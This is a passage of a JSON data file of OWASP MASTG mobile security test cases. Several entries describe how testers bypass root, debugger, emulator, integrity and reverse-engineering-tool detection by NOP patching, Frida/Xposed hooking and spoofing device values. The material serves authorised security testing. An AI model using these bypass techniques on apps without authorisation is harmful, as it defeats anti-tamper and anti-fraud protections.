        "details": "<h2>Bypassing Debugger Detection</h2><p>There's no generic way to bypass anti-debugging: the best method depends on the particular mechanism(s) used to prevent or detect debugging and the other defenses in the overall protection scheme. For example, if there are no integrity checks or you've already deactivated them, patching the app might be the easiest method. In other cases, a hooking framework or kernel modules might be preferable. The following methods describe different approaches to bypass debugger detection:</p><ul><li>Patching the anti-debugging functionality: Disable the unwanted behavior by simply overwriting it with NOP instructions. Note that more complex patches may be required if the anti-debugging mechanism is well designed.</li><li>Using Frida or Xposed to hook APIs on the Java and native layers: manipulate the return values of functions such as isDebuggable and isDebuggerConnected to hide the debugger.</li><li>Changing the environment: Android is an open environment. If nothing else works, you can modify the operating system to subvert the assumptions the developers made when designing the anti-debugging tricks.</li></ul><h3>Bypassing Example: UnCrackable App for Android Level 2</h3><p>When dealing with obfuscated apps, you'll often find that developers purposely \"hide away\" data and functionality in native libraries. You'll find an example of this in <em><a href=\"https://mas.owasp.org/MASTG-APP-0004\" rel=\"noopener noreferrer\" target=\"_blank\"> Android UnCrackable L2</a></em>.</p><p>At first glance, the code looks like the prior challenge. A class called CodeCheck is responsible for verifying the code entered by the user. The actual check appears to occur in the bar method, which is declared as a <em>native</em> method.</p><pre>package sg.vantagepoint.uncrackable2;\npublic class CodeCheck {\n    public CodeCheck() {\n        super();\n    }\n    public boolean a(String arg2) {\n        return this.bar(arg2.getBytes());\n    }\n    private native boolean bar(byte[] arg1) {\n    }\n}\n    static {\n        System.loadLibrary(\"foo\");\n    }\n</pre><p>Please see <a href=\"https://mas.owasp.org/crackmes/Android#android-uncrackable-l2\" rel=\"noopener noreferrer\" target=\"_blank\">different proposed solutions for the Android Crackme Level 2</a> in GitHub.</p><h2></h2><h2>Effectiveness Assessment</h2><p>Check for anti-debugging mechanisms, including the following criteria:</p><ul><li>Attaching jdb and ptrace-based debuggers fails or causes the app to terminate or malfunction.</li><li>Multiple detection methods are scattered throughout the app's source code (as opposed to their all being in a single method or function).</li><li>The anti-debugging defenses operate on multiple API layers (Java, native library functions, assembler/system calls).</li><li>The mechanisms are somehow original (as opposed to being copied and pasted from StackOverflow or other sources).</li></ul><p>Work on bypassing the anti-debugging defenses and answer the following questions:</p><ul><li>Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?</li><li>How difficult is identifying the anti-debugging code via static and dynamic analysis?</li><li>Did you need to write custom code to disable the defenses? How much time did you need?</li><li>What is your subjective assessment of the difficulty of bypassing the mechanisms?</li></ul><p>If anti-debugging mechanisms are missing or too easily bypassed, make suggestions in line with the effectiveness criteria above. These suggestions may include adding more detection mechanisms and better integration of existing mechanisms with other defenses.</p>",
        "code": "MASTG-TEST-0046",
        "sort_order": 110
    },
    {
        "tags":
        [
            "MASTG-TEST-0228: Position Independent Code (PIC) not Enabled"
        ],
        "testcase": "Position Independent Code (PIC) not Enabled",
        "details": "<h2>Overview</h2><p><a href=\"https://mas.owasp.org/MASTG/0x04h-Testing-Code-Quality/#position-independent-code\" rel=\"noopener noreferrer\" target=\"_blank\">PIE (Position Independent Executables)</a> are designed to enhance security by allowing executables to be loaded at random memory addresses, mitigating certain types of attacks.</p><p>In the context Mach-O file format of iOS applications:</p><ul><li>PIE is applicable to executables with the MH_EXECUTE file type, which essentially means the main app binary (e.g. YourApp.app/YourApp).</li><li>Shared libraries with the MH_DYLIB file type (dylibs and frameworks) are inherently position-independent and do not utilize the MH_PIE flag.</li></ul><p>This test case checks if the main executable is compiled with PIE.</p><h2></h2><h2>Steps</h2><ol><li>Extract the application and identify the main binary (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0054\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining and Extracting Apps</a></em>).</li><li>Run <em><a href=\"https://mas.owasp.org/MASTG-TECH-0118\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Compiler-Provided Security Features</a></em> on the main binary and grep for \"pic\" or the corresponding keyword used by the selected tool.</li></ol><h2></h2><h2>Observation</h2><p>The output should list if PIC is enabled or disabled.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if PIC is disabled.</p>",
        "code": "MASTG-TEST-0228",
        "sort_order": 104
    },
    {
        "tags":
        [
            "MASTG-TEST-0275: Dependencies with Known Vulnerabilities in the App's SBOM"
        ],
        "testcase": "Dependencies with Known Vulnerabilities in the App's SBOM",
        "details": "<h2>Overview</h2><p>This test case checks for dependencies with known vulnerabilities in iOS applications by using a Software Bill of Materials (SBOM). The SBOM should be in CycloneDX format, which is a standard for describing the components and dependencies of software.</p><h2></h2><h2>Steps</h2><ol><li>Either ask the development team to share a SBOM in CycloneDX format, or, if you have access to the original source code, create one following <em><a href=\"https://mas.owasp.org/MASTG-TECH-0132\" rel=\"noopener noreferrer\" target=\"_blank\"> Software Composition Analysis (SCA) of iOS Dependencies by Creating a SBOM</a></em>.</li><li>Upload the SBOM to <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0132\" rel=\"noopener noreferrer\" target=\"_blank\"> dependency-track</a></em>.</li><li>Inspect the <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0132\" rel=\"noopener noreferrer\" target=\"_blank\"> dependency-track</a></em> project for the use of vulnerable dependencies.</li></ol><h2></h2><h2>Observation</h2><p>The output should include a list of dependencies with names and CVE identifiers, if any.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if you can find dependencies with known vulnerabilities.</p>",
        "code": "MASTG-TEST-0275",
        "sort_order": 108
    },
    {
        "tags":
        [
            "MASTG-TEST-0080: Testing Enforced Updating"
        ],
        "testcase": "Testing Enforced Updating",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>First see whether there is an update mechanism at all: if it is not yet present, it might mean that users cannot be forced to update. If the mechanism is present, see whether it enforces \"always latest\" and whether that is indeed in line with the business strategy. Otherwise check if the mechanism is supporting to update to a given version. Make sure that every entry of the application goes through the updating mechanism in order to make sure that the update-mechanism cannot be bypassed.</p><h2></h2><h2>Dynamic analysis</h2><p>In order to test for proper updating: try downloading an older version of the application with a security vulnerability, either by a release from the developers or by using a third party app-store. Next, verify whether or not you can continue to use the application without updating it. If an update prompt is given, verify if you can still use the application by canceling the prompt or otherwise circumventing it through normal application usage. This includes validating whether the backend will stop calls to vulnerable backends and/or whether the vulnerable app-version itself is blocked by the backend. Lastly, try modifying the version number of an app while intercepting its traffic using a <a href=\"https://mas.owasp.org/MASTG/0x04f-Testing-Network-Communication/#intercepting-network-traffic-through-mitm\" rel=\"noopener noreferrer\" target=\"_blank\">Machine-in-the-Middle (MITM)</a> proxy, and observe how the backend responds (including whether the change is recorded, for example).</p>",
        "code": "MASTG-TEST-0080",
        "sort_order": 102
    },
    {
        "tags":
        [
            "MASTG-TEST-0230: Automatic Reference Counting (ARC) not enabled"
        ],
        "testcase": "Automatic Reference Counting (ARC) not enabled",
        "details": "<h2>Overview</h2><p>This test case checks if <a href=\"https://mas.owasp.org/MASTG/0x04h-Testing-Code-Quality/#automatic-reference-counting\" rel=\"noopener noreferrer\" target=\"_blank\">ARC (Automatic Reference Counting)</a> is enabled in iOS apps. ARC is a compiler feature in Objective-C and Swift that automates memory management, reducing the likelihood of memory leaks and other related issues. Enabling ARC is crucial for maintaining the security and stability of iOS applications.</p><ul><li><strong>Objective-C Code:</strong> ARC can be enabled by compiling with the -fobjc-arc flag in Clang.</li><li><strong>Swift Code:</strong> ARC is enabled by default.</li><li><strong>C/C++ Code:</strong> ARC is not applicable, as it pertains specifically to Objective-C and Swift.</li></ul><p>When ARC is enabled, binaries will include symbols such as objc_autorelease or objc_retainAutorelease.</p><h2></h2><h2>Steps</h2><ol><li>Extract the application and identify the main binary (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0054\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining and Extracting Apps</a></em>).</li><li>Identify all shared libraries (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0082\" rel=\"noopener noreferrer\" target=\"_blank\"> Get Shared Libraries</a></em>).</li><li>Run <em><a href=\"https://mas.owasp.org/MASTG-TECH-0118\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Compiler-Provided Security Features</a></em> on the main binary and each shared library looking for ARC symbols like objc_autorelease or objc_retainAutorelease.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of symbols of the main binary and each shared library.</p><h2></h2><h2>Evaluation</h2><p>The test fails if any binary or library containing Objective-C or Swift code is missing ARC-related symbols. The presence of symbols such as _objc_msgSend (Objective-C) or _swift_allocObject (Swift) without corresponding ARC symbols indicates that ARC may not be enabled.</p><p><strong>Note:</strong> Checking for these symbols only indicates that ARC is enabled somewhere in the app. While ARC is typically enabled or disabled for the entire binary, there can be corner cases where only parts of the application or libraries are protected. For example, if the app developer statically links a library that has ARC enabled, but disables it for the entire application.</p><p>If you want to be sure that specific security-critical methods are adequately protected, you need to reverse-engineer each of them and manually check for ARC, or request the source code from the developer.</p>",
        "code": "MASTG-TEST-0230",
        "sort_order": 106
    },
    {
        "tags":
        [
            "MASTG-TEST-0229: Stack Canaries Not enabled"
        ],
        "testcase": "Stack Canaries Not enabled",
        "details": "<h2>Overview</h2><p>This test case checks if the main binary or any libraries of the app are compiled without stack canaries and therefore lack <a href=\"https://mas.owasp.org/MASTG/0x06i-Testing-Code-Quality-and-Build-Settings/#binary-protection-mechanisms\" rel=\"noopener noreferrer\" target=\"_blank\">stack smashing protection</a>, a common mitigation technique against buffer overflow attacks.</p><p>This test applies to all binaries and libraries:</p><ul><li>It is especially important for non-memory safe languages like Objective-C or C/C++.</li><li>For pure Swift apps, checking for stack canaries can be usually skipped, as Swift is considered a memory safe by design and conventional parsing techniques cannot detect stack canaries in Swift binaries (see the \"canary – exceptions\" section of this <a href=\"https://sensepost.com/blog/2021/on-ios-binary-protections/\" rel=\"noopener noreferrer\" target=\"_blank\">blog post ↗</a>).</li></ul><p>To differentiate between Objective-C and Swift binaries, you can inspect the imports and linked libraries. Detecting Objective-C binaries is straightforward, but detecting pure Swift binaries is more challenging because depending on the Swift version and compiler settings, the binary may still contain Objective-C symbols or libraries. See the \"identifying objc vs swift\" section of this <a href=\"https://sensepost.com/blog/2021/on-ios-binary-protections/\" rel=\"noopener noreferrer\" target=\"_blank\">blog post ↗</a> for more details.</p><h2></h2><h2>Steps</h2><ol><li>Extract the application and identify the main binary (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0054\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining and Extracting Apps</a></em>).</li><li>Identify all shared libraries (<em><a href=\"https://mas.owasp.org/MASTG-TECH-0082\" rel=\"noopener noreferrer\" target=\"_blank\"> Get Shared Libraries</a></em>).</li><li>Run <em><a href=\"https://mas.owasp.org/MASTG-TECH-0118\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Compiler-Provided Security Features</a></em> on the main binary and each shared library.</li><li>If the output contains the symbol __stack_chk_fail it indicates stack canaries are enabled.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of symbols of the main binary and each shared library.</p><h2></h2><h2>Evaluation</h2><p>The test case fails any binary or library is not purely Swift but does not contain methods indicating stack canaries like objc_autorelease or objc_retainAutorelease.</p><p><strong>Note:</strong> Checking for the __stack_chk_fail symbol only indicates that stack smashing protection is enabled somewhere in the app. While stack canaries are typically enabled or disabled for the entire binary, there may be corner cases where only parts of the application are protected. For example, if the app developer statically links a library with stack smashing protection enabled, but disables it for the entire application.</p><p>If you want to be sure that specific security-critical methods are sufficiently protected, you need to reverse-engineer each of them and manually check for stack smashing protection.</p><p>When evaluating this please note that there are potential <strong>expected false positives</strong> for which the test case should be considered as passed. To be certain for these cases, they require manual review of the original source code and the compilation flags used.</p><p>The following examples cover some of the false positive cases that might be encountered:</p><h3>Use of Memory Safe Languages</h3><p>The Flutter framework does not use stack canaries because of the way <a href=\"https://docs.flutter.dev/reference/security-false-positives#shared-objects-should-use-stack-canary-values\" rel=\"noopener noreferrer\" target=\"_blank\">Dart mitigates buffer overflows ↗</a>.</p><h3>Compiler Optimizations</h3><p>Sometimes, due to the size of the library and the optimizations applied by the compiler, it might be possible that the library was originally compiled with stack canaries but they were optimized out. For example, this is the case for some <a href=\"https://github.com/facebook/react-native/issues/36870#issuecomment-1714007068\" rel=\"noopener noreferrer\" target=\"_blank\">react native apps ↗</a>. They are built with -fstack-protector-strong but when attempting to search for stack_chk_fail inside the binary files, it is not found. The React Native developers in this case declare that they won't be adding -fstack-protector-all as, in their case, <a href=\"https://github.com/facebook/react-native/issues/36870#issuecomment-1714007068\" rel=\"noopener noreferrer\" target=\"_blank\">they consider that doing so will add a performance hit for no effective security gain ↗</a>.</p>",
        "code": "MASTG-TEST-0229",
        "sort_order": 105
    },
    {
        "tags":
        [
            "MASTG-TEST-0045: Testing Root Detection"
        ],
        "testcase": "Testing Root Detection",
        "details": "<h2>Bypassing Root Detection</h2><p>Run execution traces with jdb, <a href=\"https://developer.android.com/studio/profile/monitor\" rel=\"noopener noreferrer\" target=\"_blank\">DDMS ↗</a>, strace, and/or kernel modules to find out what the app is doing. You'll usually see all kinds of suspect interactions with the operating system, such as opening su for reading and obtaining a list of processes. These interactions are surefire signs of root detection. Identify and deactivate the root detection mechanisms, one at a time. If you're performing a black box resilience assessment, disabling the root detection mechanisms is your first step.</p><p>To bypass these checks, you can use several techniques, most of which were introduced in the \"Reverse Engineering and Tampering\" chapter:</p><ul><li>Renaming binaries. For example, in some cases simply renaming the su binary is enough to defeat root detection (try not to break your environment though!).</li><li>Unmounting /proc to prevent reading of process lists. Sometimes, the unavailability of /proc is enough to bypass such checks.</li><li>Using Frida or Xposed to hook APIs on the Java and native layers. This hides files and processes, hides the contents of files, and returns all kinds of bogus values that the app requests.</li><li>Hooking low-level APIs by using kernel modules.</li><li>Patching the app to remove the checks.</li></ul><h2></h2><h2>Effectiveness Assessment</h2><p>Check for root detection mechanisms, including the following criteria:</p><ul><li>Multiple detection methods are scattered throughout the app (as opposed to putting everything into a single method).</li><li>The root detection mechanisms operate on multiple API layers (Java APIs, native library functions, assembler/system calls).</li><li>The mechanisms are somehow original (they're not copied and pasted from StackOverflow or other sources).</li></ul><p>Develop bypass methods for the root detection mechanisms and answer the following questions:</p><ul><li>Can the mechanisms be easily bypassed with standard tools, such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0142\" rel=\"noopener noreferrer\" target=\"_blank\"> Choicy</a></em>?</li><li>Is static/dynamic analysis necessary to handle the root detection?</li><li>Do you need to write custom code?</li><li>How long did successfully bypassing the mechanisms take?</li><li>What is your assessment of the difficulty of bypassing the mechanisms?</li></ul><p>If root detection is missing or too easily bypassed, make suggestions in line with the effectiveness criteria listed above. These suggestions may include more detection mechanisms and better integration of existing mechanisms with other defenses.</p>",
        "code": "MASTG-TEST-0045",
        "sort_order": 109
    },
    {
        "tags":
        [
            "MASTG-TEST-0273: Identify Dependencies with Known Vulnerabilities by Scanning Dependency Managers Artifacts"
        ],
        "testcase": "Identify Dependencies with Known Vulnerabilities by Scanning Dependency Managers Artifacts",
        "details": "<h2>Overview</h2><p>In this test case we are identifying dependencies with known vulnerabilities in iOS. Dependencies are integrated through dependency managers, and there might be one or more of them being used. We therefore need all of the relevant artifacts created by them to analyse them with a SCA scanning tool.</p><h2></h2><h2>Steps</h2><ol><li>In order to do this in the most efficient way you would need to ask the developer(s) which dependency managers are being used and to share the relevant file(s) created by them. Follow <em><a href=\"https://mas.owasp.org/MASTG-TECH-0133\" rel=\"noopener noreferrer\" target=\"_blank\"> Software Composition Analysis (SCA) of iOS Dependencies by Scanning Package Manager Artifacts</a></em> for on overview of the package managers and request for the relevant files.</li><li>Run a SCA analysis tool such as <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0131\" rel=\"noopener noreferrer\" target=\"_blank\"> dependency-check</a></em> against the file(s) created by the dependency manager(s) and look for the use of vulnerable dependencies.</li></ol><h2></h2><h2>Observation</h2><p>The output should include the dependency name and the CVE identifiers for any dependency with known vulnerabilities.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if you can find dependencies with known vulnerabilities.</p>",
        "code": "MASTG-TEST-0273",
        "sort_order": 107
    },
    {
        "tags":
        [
            "MASTG-TEST-0079: Testing Object Persistence"
        ],
        "testcase": "Testing Object Persistence",
        "details": "<h2>Overview</h2><h2></h2><h2>Static Analysis</h2><p>All different flavors of object persistence share the following concerns:</p><ul><li>If you use object persistence to store sensitive information on the device, then make sure that the data is encrypted: either at the database level, or specifically at the value level.</li><li>Need to guarantee the integrity of the information? Use an HMAC mechanism or sign the information stored. Always verify the HMAC/signature before processing the actual information stored in the objects.</li><li>Make sure that keys used in the two notions above are safely stored in the KeyChain and well protected. See the chapter \"<a href=\"https://mas.owasp.org/MASTG/0x06d-Testing-Data-Storage/\" rel=\"noopener noreferrer\" target=\"_blank\">Data Storage on iOS</a>\" for more details.</li><li>Ensure that the data within the deserialized object is carefully validated before it is actively used (e.g., no exploit of business/application logic is possible).</li><li>Do not use persistence mechanisms that use <a href=\"https://developer.apple.com/documentation/objectivec/objective-c_runtime\" rel=\"noopener noreferrer\" target=\"_blank\">Runtime Reference ↗</a> to serialize/deserialize objects in high-risk applications, as the attacker might be able to manipulate the steps to execute business logic via this mechanism (see the chapter \"<a href=\"https://mas.owasp.org/MASTG/0x06j-Testing-Resiliency-Against-Reverse-Engineering/\" rel=\"noopener noreferrer\" target=\"_blank\">iOS Anti-Reversing Defenses</a>\" for more details).</li><li>Note that in Swift 2 and beyond, a <a href=\"https://developer.apple.com/documentation/swift/mirror\" rel=\"noopener noreferrer\" target=\"_blank\">Mirror ↗</a> can be used to read parts of an object, but cannot be used to write against the object.</li></ul><h2></h2><h2>Dynamic Analysis</h2><p>There are several ways to perform dynamic analysis:</p><ul><li>For the actual persistence: Use the techniques described in the \"Data Storage on iOS\" chapter.</li><li>For the serialization itself: Use a debug build or use Frida / objection to see how the serialization methods are handled (e.g., whether the application crashes or extra information can be extracted by enriching the objects).</li></ul>",
        "code": "MASTG-TEST-0079",
        "sort_order": 101
    },
    {
        "tags":
        [
            "MASTG-TEST-0086: Memory Corruption Bugs"
        ],
        "testcase": "Memory Corruption Bugs",
        "details": "<h2>Overview</h2><p></p><h2>Static Analysis</h2><p>Are there native code parts? If so: check for the given issues in the general memory corruption section. Native code is a little harder to spot when compiled. If you have the sources then you can see that C files use .c source files and .h header files and C++ uses .cpp files and .h files. This is a little different from the .swift and the .m source files for Swift and Objective-C. These files can be part of the sources, or part of third party libraries, registered as frameworks and imported through various tools, such as Carthage, the Swift Package Manager or Cocoapods.</p><p>For any managed code (Objective-C / Swift) in the project, check the following items:</p><ul><li>The doubleFree issue: when free is called twice for a given region instead of once.</li><li>Retaining cycles: look for cyclic dependencies by means of strong references of components to one another which keep materials in memory.</li><li>Using instances of UnsafePointer can be managed wrongly, which will allow for various memory corruption issues.</li><li>Trying to manage the reference count to an object by Unmanaged manually, leading to wrong counter numbers and a too late/too soon release.</li></ul><p><a href=\"https://academy.realm.io/posts/russ-bishop-unsafe-swift/\" rel=\"noopener noreferrer\" target=\"_blank\">A great talk is given on this subject at Realm academy ↗</a> and <a href=\"https://www.raywenderlich.com/780-unsafe-swift-using-pointers-and-interacting-with-c\" rel=\"noopener noreferrer\" target=\"_blank\">a nice tutorial to see what is actually happening ↗</a> is provided by Ray Wenderlich on this subject.</p><p>Please note that with Swift 5 you can only deallocate full blocks, which means the playground has changed a bit.</p><h2></h2><h2>Dynamic Analysis</h2><p>There are various tools provided which help to identify memory bugs within Xcode, such as the Debug Memory graph introduced in Xcode 8 and the Allocations and Leaks instrument in Xcode.</p><p>Next, you can check whether memory is freed too fast or too slow by enabling NSAutoreleaseFreedObjectCheckEnabled, NSZombieEnabled, NSDebugEnabled in Xcode while testing the application.</p><p>There are various well written explanations which can help with taking care of memory management. These can be found in the reference list of this chapter.</p>",
        "code": "MASTG-TEST-0086",
        "sort_order": 103
    },
    {
        "tags":
        [
            "MASTG-TEST-0225: Usage of Insecure Signature Key Size"
        ],
        "testcase": "Usage of Insecure Signature Key Size",
        "details": "<h2>Overview</h2><p>For Android apps, the cryptographic strength of the APK signature is essential for maintaining the app's integrity and authenticity. Using a signature key with insufficient length, such as an RSA key shorter than 2048 bits, weakens security, making it easier for attackers to compromise the signature. This vulnerability could allow malicious actors to forge signatures, tamper with the app's code, or distribute unauthorized, modified versions.</p><h2></h2><h2>Steps</h2><ol><li>List the additional signature information using <em><a href=\"https://mas.owasp.org/MASTG-TECH-0116\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Information about the APK Signature</a></em>.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain the information about the key size in a line like: Signer #1 key size (bits):.</p><h2></h2><h2>Evaluation</h2><p>The test case fails if any of the key sizes (in bits) is less than 2048 (RSA). For example, Signer #1 key size (bits): 1024.</p>",
        "code": "MASTG-TEST-0225",
        "sort_order": 117
    },
    {
        "tags":
        [
            "MASTG-TEST-0047: Testing File Integrity Checks"
        ],
        "testcase": "Testing File Integrity Checks",
        "details": "<h2>Bypassing File Integrity Checks</h2><h3>Bypassing the application-source integrity checks</h3><ol><li>Patch the anti-debugging functionality. Disable the unwanted behavior by simply overwriting the associated bytecode or native code with NOP instructions.</li><li>Use Frida or Xposed to hook file system APIs on the Java and native layers. Return a handle to the original file instead of the modified file.</li><li>Use the kernel module to intercept file-related system calls. When the process attempts to open the modified file, return a file descriptor for the unmodified version of the file.</li></ol><p>Refer to Method Hooking for examples of patching, code injection, and kernel modules.</p><h3>Bypassing the storage integrity checks</h3><ol><li>Retrieve the data from the device.</li><li>Alter the retrieved data and then put it back into storage.</li></ol><h2></h2><h2>Effectiveness Assessment</h2><p><strong>Application-source integrity checks:</strong></p><p>Run the app in an unmodified state and make sure that everything works. Apply simple patches to classes.dex and any .so libraries in the app package. Re-package and re-sign the app as described in the \"Basic Security Testing\" chapter, then run the app. The app should detect the modification and respond in some way. At the very least, the app should alert the user and/or terminate. Work on bypassing the defenses and answer the following questions:</p><ul><li>Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?</li><li>How difficult is identifying the anti-debugging code via static and dynamic analysis?</li><li>Did you need to write custom code to disable the defenses? How much time did you need?</li><li>What is your assessment of the difficulty of bypassing the mechanisms?</li></ul><p><strong>Storage integrity checks:</strong></p><p>An approach similar to that for application-source integrity checks applies. Answer the following questions:</p><ul><li>Can the mechanisms be bypassed trivially (e.g., by changing the contents of a file or a key-value)?</li><li>How difficult is getting the HMAC key or the asymmetric private key?</li><li>Did you need to write custom code to disable the defenses? How much time did you need?</li><li>What is your assessment of the difficulty of bypassing the mechanisms?</li></ul>",
        "code": "MASTG-TEST-0047",
        "sort_order": 111
    },
    {
        "tags":
        [
            "MASTG-TEST-0049: Testing Emulator Detection"
        ],
        "testcase": "Testing Emulator Detection",
        "details": "<h2>Bypassing Emulator Detection</h2><ol><li>Patch the emulator detection functionality. Disable the unwanted behavior by simply overwriting the associated bytecode or native code with NOP instructions.</li><li>Use Frida or Xposed APIs to hook file system APIs on the Java and native layers. Return innocent-looking values (preferably taken from a real device) instead of the telltale emulator values. For example, you can override the TelephonyManager.getDeviceID method to return an IMEI value.</li></ol><h2></h2><h2>Effectiveness Assessment</h2><p>Install and run the app in the emulator. The app should detect that it is being executed in an emulator and terminate or refuse to execute the functionality that's meant to be protected.</p><p>Work on bypassing the defenses and answer the following questions:</p><ul><li>How difficult is identifying the emulator detection code via static and dynamic analysis?</li><li>Can the detection mechanisms be bypassed trivially (e.g., by hooking a single API function)?</li><li>Did you need to write custom code to disable the anti-emulation feature(s)? How much time did you need?</li><li>What is your assessment of the difficulty of bypassing the mechanisms?</li></ul>",
        "code": "MASTG-TEST-0049",
        "sort_order": 113
    },
    {
        "tags":
        [
            "MASTG-TEST-0224: Usage of Insecure Signature Version"
        ],
        "testcase": "Usage of Insecure Signature Version",
        "details": "<h2>Overview</h2><p>Not using newer APK signing schemes means that the app lacks the enhanced security provided by more robust, updated mechanisms.</p><p>This test checks if the outdated v1 signature scheme is enabled. The v1 scheme is vulnerable to certain attacks, such as the \"Janus\" vulnerability (<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-13156\" rel=\"noopener noreferrer\" target=\"_blank\">CVE-2017-13156 ↗</a>), because it does not cover all parts of the APK file, allowing malicious actors to potentially <strong>modify parts of the APK without invalidating the signature</strong>. Relying solely on v1 signing therefore increases the risk of tampering and compromises app security.</p><p>To learn more about APK Signing Schemes, see <a href=\"https://mas.owasp.org/MASTG/0x05a-Platform-Overview/#signing-process\" rel=\"noopener noreferrer\" target=\"_blank\">\"Signing Process\"</a>.</p><h2></h2><h2>Steps</h2><ol><li>Obtain the minSdkVersion attribute from the AndroidManifest.xml, e.g., via <em><a href=\"https://mas.owasp.org/MASTG-TECH-0117\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Information from the AndroidManifest</a></em>.</li><li>List all used signature schemes as shown in <em><a href=\"https://mas.owasp.org/MASTG-TECH-0116\" rel=\"noopener noreferrer\" target=\"_blank\"> Obtaining Information about the APK Signature</a></em>.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain the value of the minSdkVersion attribute and the used signature schemes (for example Verified using v3 scheme (APK Signature Scheme v3): true).</p><h2></h2><h2>Evaluation</h2><p>The test case fails if the app has a minSdkVersion attribute of 24 and above, and only the v1 signature scheme is enabled.</p><h2></h2><h2>Mitigations</h2><ul><li><em><a href=\"https://mas.owasp.org/MASTG-BEST-0006\" rel=\"noopener noreferrer\" target=\"_blank\"> Use Up-to-Date APK Signing Schemes</a></em></li></ul>",
        "code": "MASTG-TEST-0224",
        "sort_order": 116
    },
    {
        "tags":
        [
            "MASTG-TEST-0247: References to APIs for Detecting Secure Screen Lock"
        ],
        "testcase": "References to APIs for Detecting Secure Screen Lock",
        "details": "<h2>Overview</h2><p>This test verifies whether an app is running on a device with a passcode set. Android apps can determine whether a secure <a href=\"https://support.google.com/android/answer/9079129\" rel=\"noopener noreferrer\" target=\"_blank\">screen lock (such as PIN, or password) ↗</a> is enabled by using platform-provided APIs. Specifically, apps can utilize the <a href=\"https://developer.android.com/reference/android/app/KeyguardManager\" rel=\"noopener noreferrer\" target=\"_blank\">KeyguardManager ↗</a> API, which provides the <a href=\"https://developer.android.com/reference/android/app/KeyguardManager#isDeviceSecure()\" rel=\"noopener noreferrer\" target=\"_blank\">isDeviceSecure() ↗</a> and <a href=\"https://developer.android.com/reference/android/app/KeyguardManager#isKeyguardLocked()\" rel=\"noopener noreferrer\" target=\"_blank\">isKeyguardSecure() ↗</a> methods to check if the device has a secure lock mechanism in place.</p><p>Additionally, apps can use the <a href=\"https://developer.android.com/reference/android/hardware/biometrics/BiometricManager#canAuthenticate(int)\" rel=\"noopener noreferrer\" target=\"_blank\">BiometricManager#canAuthenticate(int) ↗</a> API to check whether biometric authentication is available and can be used. Since biometric authentication on Android requires a secure screen lock as a fallback, this method can serve as an alternative check when <a href=\"https://developer.android.com/reference/android/app/KeyguardManager\" rel=\"noopener noreferrer\" target=\"_blank\">KeyguardManager ↗</a> is unavailable or restricted by device manufacturers.</p><p>If an app relies on biometrics for authentication, it should ensure that biometric authentication is enforced using the <a href=\"https://developer.android.com/reference/android/hardware/biometrics/BiometricPrompt\" rel=\"noopener noreferrer\" target=\"_blank\">BiometricPrompt ↗</a> API or by requiring authentication for cryptographic key access via the <strong>Android KeyStore System</strong>. However, apps <strong>cannot force</strong> users to enable biometrics at the system level, only enforce its use within the app for accessing sensitive functionality.</p><h2></h2><h2>Steps</h2><ol><li>Use <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0110\" rel=\"noopener noreferrer\" target=\"_blank\"> semgrep</a></em> to identify the API that checks whether a secure screen lock has been set.</li></ol><h2></h2><h2>Observation</h2><p>The output should contain a list of locations where relevant APIs are used.</p><h2></h2><h2>Evaluation</h2><p>The test fails if an app doesn't use any API to verify the secure screen lock presence.</p>",
        "code": "MASTG-TEST-0247",
        "sort_order": 120
    },
    {
        "tags":
        [
            "MASTG-TEST-0050: Testing Runtime Integrity Checks"
        ],
        "testcase": "Testing Runtime Integrity Checks",
        "details": "<h2>Effectiveness Assessment</h2><p>Make sure that all file-based detection of reverse engineering tools is disabled. Then, inject code by using Xposed, Frida, and Substrate, and attempt to install native hooks and Java method hooks. The app should detect the \"hostile\" code in its memory and respond accordingly.</p><p>Work on bypassing the checks with the following techniques:</p><ol><li>Patch the integrity checks. Disable the unwanted behavior by overwriting the respective bytecode or native code with NOP instructions.</li><li>Use Frida or Xposed to hook the APIs used for detection and return fake values.</li></ol>",
        "code": "MASTG-TEST-0050",
        "sort_order": 114
    },
    {
        "tags":
        [
            "MASTG-TEST-0048: Testing Reverse Engineering Tools Detection"
        ],
        "testcase": "Testing Reverse Engineering Tools Detection",
        "details": "<h2>Effectiveness Assessment</h2><p>Launch the app with various reverse engineering tools and frameworks installed in your test device. Include at least the following: <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0031\" rel=\"noopener noreferrer\" target=\"_blank\"> Frida</a></em>, <em><a href=\"https://mas.owasp.org/MASTG-TOOL-0027\" rel=\"noopener noreferrer\" target=\"_blank\"> Xposed</a></em>.</p><p>The app should respond in some way to the presence of those tools. For example by:</p><ul><li>Alerting the user and asking for accepting liability.</li><li>Preventing execution by gracefully terminating.</li><li>Securely wiping any sensitive data stored on the device.</li><li>Reporting to a backend server, e.g, for fraud detection.</li></ul><p>Next, work on bypassing the detection of the reverse engineering tools and answer the following questions:</p><ul><li>Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?</li><li>How difficult is identifying the anti reverse engineering code via static and dynamic analysis?</li><li>Did you need to write custom code to disable the defenses? How much time did you need?</li><li>What is your assessment of the difficulty of bypassing the mechanisms?</li></ul><p>The following steps should guide you when bypassing detection of reverse 